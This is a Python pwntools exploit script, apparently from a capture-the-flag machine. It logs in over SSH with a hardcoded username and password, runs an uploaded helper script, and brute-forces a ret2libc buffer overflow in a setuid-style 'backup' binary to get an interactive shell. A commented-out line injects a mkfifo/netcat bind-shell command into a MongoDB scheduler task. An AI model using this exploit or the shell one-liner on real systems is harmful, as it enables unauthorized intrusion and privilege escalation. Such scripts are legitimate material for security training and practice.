#! /home/status-quo/python-venv/bin/python
from pwn import *
import subprocess
## TEMPLATE YOIINKED FROM RADBOUD

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)



con = ssh(host=sys.argv[1], user='mark',password='5AYRft73VtFpc84k')
#con.run_to_end("""mongo -u mark -p 5AYRft73VtFpc84k scheduler --eval 'db.tasks.insert({"cmd": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 1337 > /tmp/f"})'>/dev/null;""")
con.put("./user.sh","/tmp/user.sh")

chmod = con.system('/bin/chmod +x /tmp/user.sh')
chmod.close()

sh_tom = con.system("/tmp/user.sh")
con.recvuntil(b'$ ')

padding = b"B"*512

libc = 0xf75c2000
SYSTEM_offset = 0x003a940
EXIT_offset = 0x0002e7b0
BINSH_offset = 0x15900b

SYSTEM = p32(SYSTEM_offset + libc)
EXIT = p32(EXIT_offset + libc)
BINSH = p32(BINSH_offset + libc)

PAYLOAD = padding + SYSTEM + EXIT + BINSH
attempt = 0
while True:
    print(f'starting attempt {attempt}')
    sh_tom.sendline(b"/usr/local/bin/backup a '' " + PAYLOAD)
    if b'(core dumped)' in sh_tom.recvline(timeout=10):
        attempt += 1
    else:
        sh_tom.interactive()

# gg
